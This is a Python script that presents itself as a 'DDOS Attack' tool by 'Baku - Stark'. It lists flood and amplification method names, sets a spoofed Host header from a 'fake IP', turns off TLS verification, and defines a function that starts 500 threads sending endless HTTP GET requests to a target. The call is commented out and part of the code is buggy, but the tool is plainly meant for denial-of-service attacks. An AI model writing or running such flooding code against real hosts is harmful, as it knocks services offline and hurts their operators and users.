import os, sys, platform, argparse, threading

from art import * # pip install art
from socket import *
from json import load
from certifi import where
from random import shuffle, choice
from typing import Any, List, Set, Tuple
from cmd_styles.cmd_decorator import Colors
from logging import basicConfig, getLogger, shutdown
from ssl import CERT_NONE, SSLContext, create_default_context

class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
    }

    LAYER4_AMP: Set[str] = {
        "MEM", "NTP", "DNS", "ARD",
        "CLDAP", "CHAR", "RDP"
    }

    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
        "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
        "MCBOT", "CONNECTION", "CPS", "FIVEM",
        "TS3", "MCPE", "ICMP"
    }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}

class DDOS_ATTACK():
    __fake_ip : str
    __fake_ip_list : list = ["208.248.193.186", "182.21.20.32", "36.12.195.34"]

    with open(r"./config.json", encoding="utf-8") as file_confiJSON:
        __config_json = load(file_confiJSON)

    basicConfig(
        format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S"
    )

    logger = getLogger("Baku - Stark")
    logger.setLevel("INFO")
    ctx : SSLContext = create_default_context(cafile=where())
    ctx.check_hostname = False
    ctx.verify_mode = CERT_NONE

    def __init__(self) -> None:
        super().__init__()

        # print(fake_ip)
        print(self.__config_json)
        # print(self.logger) <Logger Baku - Stark (INFO)>
        # print(self.ctx)

        shuffle(self.__fake_ip_list) # random FAKE IP ADDRESS in list
        
        self.menu_author()
        #self.__target = str(input("\nInsert target's IP ADRESS: ")).strip()

        _parser = argparse.ArgumentParser()
        _parser.add_argument(
            "ip",
            nargs="?",
            type= str,
            default=None,
            help="Type a =FAKE IP ADRESS="
        )

        if _parser.parse_args().ip:
            self.__fake_ip = str(_parser.parse_args().ip)
            print(f"[-] Your arg : {self.__fake_ip}")

        else:
            self.__fake_ip = self.__fake_ip_list[0]
            print(f"[-] No args... Your current Fake IP : {self.__fake_ip}")

        #self.DDOS(self.__fake_ip, self.__target)

    def menu_author(self) -> None:
        """
            Menu panel 'Baku Stark'.
        """

        print(Colors.CYAN + "=" * 50 + Colors.END)

        tprint("DDOS\nAttack\n", font="graffiti")
        print(Colors.BLUE + f"- Author : Baku - Stark\n- Language : Python (Version 3.11.2) | Your Version: {platform.python_version()}" + Colors.END)

        print(Colors.CYAN + "=" * 50 + Colors.END)

    def DDOS(self, fake_ip : str, target : str = "10.0.0.138") -> None:
        port = 80
        __attack_num__ = 0

        print(f"[-] Your target : {target}")

        def attack():
            while True:
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                
                __ip__ = s.getsockname()[0]

                __attack_num__ += 1
                print(f"[ATTACK - {target}] N° : {__attack_num__}")
                print('')
                
                s.close()

        for i in range(500):
            thread = threading.Thread(target=attack)
            thread.start()
        
if __name__ == '__main__':
    #print(platform.system())

    if platform.system() == "Linux":
        os.system("clear")

    else:
        os.system("cls")
        
    DDOS_ATTACK()